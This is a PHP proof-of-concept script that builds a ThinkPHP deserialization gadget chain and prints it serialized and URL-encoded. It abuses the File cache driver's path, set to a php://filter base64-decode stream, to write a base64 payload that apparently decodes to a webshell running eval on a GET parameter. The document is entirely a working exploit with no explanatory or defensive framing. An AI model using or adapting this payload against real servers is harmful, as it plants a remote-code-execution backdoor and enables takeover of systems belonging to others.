<?php
namespace League\Flysystem\Cached\Storage;
abstract class AbstractCache {
}
namespace think\cache;
use think\cache\Driver;
abstract class Driver {
}
namespace think\cache\driver;
use think\cache\driver;
class File extends Driver {
	protected $options = [];
	public function __construct() {
		$this->options = [
		'expire' => 0,
		'cache_subdir' => false,
		'prefix' => '',
		'path' => 'php://filter/write=convert.base64-
decode/resource=./',
		'hash_type' => 'md5',
		'data_compress' => false,
		'tag_prefix' => 'tag:',
		'serialize'=> ['trim'] //使用trim去掉[]
		];
	}
}
namespace think\filesystem;
use League\Flysystem\Cached\Storage\AbstractCache;
class CacheStore extends AbstractCache {
	protected $store;
	protected $key;
	protected $autosave;
	protected $complete;
	public function __construct($store) {
		$this->autosave = false;
		$this->key = "1";
		$this->complete = 'uuuPDw/cGhwIHBocGluZm8oKTtldmFsKCRfR0VUWzFdKTs/PiA=';
		$this->store = $store;
	}
}
use think\cache\driver\file;
$a = new CacheStore(new File());
echo serialize($a);
echo "
";
echo urlencode(serialize($a));
?>